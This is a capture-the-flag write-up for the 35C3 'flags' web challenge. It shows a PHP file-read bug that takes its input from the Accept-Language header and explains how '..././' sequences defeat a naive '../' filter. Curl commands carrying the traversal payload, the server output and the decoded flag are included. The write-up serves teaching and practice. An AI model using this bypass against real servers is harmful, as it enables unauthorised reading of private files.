# flags
Web

## Description:
> Fun with flags: http://35.207.132.47:84
> 
> Flag is at /flag


## Solution:

Visiting the site, we are welcomed with the following piece of code:
```php
highlight_file(__FILE__);
$lang = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'ot';
$lang = explode(',', $lang)[0];
$lang = str_replace('../', '', $lang);
$c = file_get_contents("flags/$lang");
if (!$c) $c = file_get_contents("flags/ot");
echo '<img src="data:image/jpeg;base64,' . base64_encode($c) . '">';
```

The following line looks like it's vulnerable to directory traversal:
```php
file_get_contents("flags/$lang")
```

However, there is some basic protection against this:
```php
$lang = str_replace('../', '', $lang);
```

So basic, that it neglects the case where the user sends `..././` as input. In this case, the `../` will be stripped, leaving `../`.

Let's try it:
```console
root@kali:/media/sf_CTFs/35c3ctf/flags# curl -H "Accept-Language: ..././flag" http://35.207.132.47:84/ -s | head -5
<code><span style="color: #000000">
<span style="color: #0000BB">&lt;?php<br />&nbsp;&nbsp;highlight_file</span><span style="color: #007700">(</span><span style="color: #0000BB">__FILE__</span><span style="color: #007700">);<br />&nbsp;&nbsp;</span><span style="color: #0000BB">$lang&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">[</span><span style="color: #DD0000">'HTTP_ACCEPT_LANGUAGE'</span><span style="color: #007700">]&nbsp;??&nbsp;</span><span style="color: #DD0000">'ot'</span><span style="color: #007700">;<br />&nbsp;&nbsp;</span><span style="color: #0000BB">$lang&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">explode</span><span style="color: #007700">(</span><span style="color: #DD0000">','</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">$lang</span><span style="color: #007700">)[</span><span style="color: #0000BB">0</span><span style="color: #007700">];<br />&nbsp;&nbsp;</span><span style="color: #0000BB">$lang&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">'../'</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">''</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">$lang</span><span style="color: #007700">);<br />&nbsp;&nbsp;</span><span style="color: #0000BB">$c&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">file_get_contents</span><span style="color: #007700">(</span><span style="color: #DD0000">"flags/</span><span style="color: #0000BB">$lang</span><span style="color: #DD0000">"</span><span style="color: #007700">);<br />&nbsp;&nbsp;if&nbsp;(!</span><span style="color: #0000BB">$c</span><span style="color: #007700">)&nbsp;</span><span style="color: #0000BB">$c&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">file_get_contents</span><span style="color: #007700">(</span><span style="color: #DD0000">"flags/ot"</span><span style="color: #007700">);<br />&nbsp;&nbsp;echo&nbsp;</span><span style="color: #DD0000">'&lt;img&nbsp;src="data:image/jpeg;base64,'&nbsp;</span><span style="color: #007700">.&nbsp;</span><span style="color: #0000BB">base64_encode</span><span style="color: #007700">(</span><span style="color: #0000BB">$c</span><span style="color: #007700">)&nbsp;.&nbsp;</span><span style="color: #DD0000">'"&gt;'</span><span style="color: #007700">;<br /><br /></span>
</span>
</code><br />
<b>Warning</b>:  file_get_contents(flags/../flag): failed to open stream: No such file or directory in <b>/var/www/html/index.php</b> on line <b>6</b><br />
```

Notice the warning on the last line. It means that our strategy is working, and also leaks the current location in the directory tree.
This means we will find the flag four directories up:

```console
root@kali:/media/sf_CTFs/35c3ctf/flags# payload=$(python -c "print ('..././' * 4) + 'flag'")
root@kali:/media/sf_CTFs/35c3ctf/flags# echo $payload
..././..././..././..././flag
root@kali:/media/sf_CTFs/35c3ctf/flags# curl -H "Accept-Language: $payload" http://35.207.132.47:84/ -s && echo
<code><span style="color: #000000">
<span style="color: #0000BB">&lt;?php<br />&nbsp;&nbsp;highlight_file</span><span style="color: #007700">(</span><span style="color: #0000BB">__FILE__</span><span style="color: #007700">);<br />&nbsp;&nbsp;</span><span style="color: #0000BB">$lang&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">[</span><span style="color: #DD0000">'HTTP_ACCEPT_LANGUAGE'</span><span style="color: #007700">]&nbsp;??&nbsp;</span><span style="color: #DD0000">'ot'</span><span style="color: #007700">;<br />&nbsp;&nbsp;</span><span style="color: #0000BB">$lang&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">explode</span><span style="color: #007700">(</span><span style="color: #DD0000">','</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">$lang</span><span style="color: #007700">)[</span><span style="color: #0000BB">0</span><span style="color: #007700">];<br />&nbsp;&nbsp;</span><span style="color: #0000BB">$lang&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">'../'</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">''</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">$lang</span><span style="color: #007700">);<br />&nbsp;&nbsp;</span><span style="color: #0000BB">$c&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">file_get_contents</span><span style="color: #007700">(</span><span style="color: #DD0000">"flags/</span><span style="color: #0000BB">$lang</span><span style="color: #DD0000">"</span><span style="color: #007700">);<br />&nbsp;&nbsp;if&nbsp;(!</span><span style="color: #0000BB">$c</span><span style="color: #007700">)&nbsp;</span><span style="color: #0000BB">$c&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">file_get_contents</span><span style="color: #007700">(</span><span style="color: #DD0000">"flags/ot"</span><span style="color: #007700">);<br />&nbsp;&nbsp;echo&nbsp;</span><span style="color: #DD0000">'&lt;img&nbsp;src="data:image/jpeg;base64,'&nbsp;</span><span style="color: #007700">.&nbsp;</span><span style="color: #0000BB">base64_encode</span><span style="color: #007700">(</span><span style="color: #0000BB">$c</span><span style="color: #007700">)&nbsp;.&nbsp;</span><span style="color: #DD0000">'"&gt;'</span><span style="color: #007700">;<br /><br /></span>
</span>
</code><img src="data:image/jpeg;base64,MzVjM190aGlzX2ZsYWdfaXNfdGhlX2JlNXRfZmw0Zwo=">
root@kali:/media/sf_CTFs/35c3ctf/flags# echo MzVjM190aGlzX2ZsYWdfaXNfdGhlX2JlNXRfZmw0Zwo= | base64 -d
35c3_this_flag_is_the_be5t_fl4g
```

The flag: 35c3_this_flag_is_the_be5t_fl4g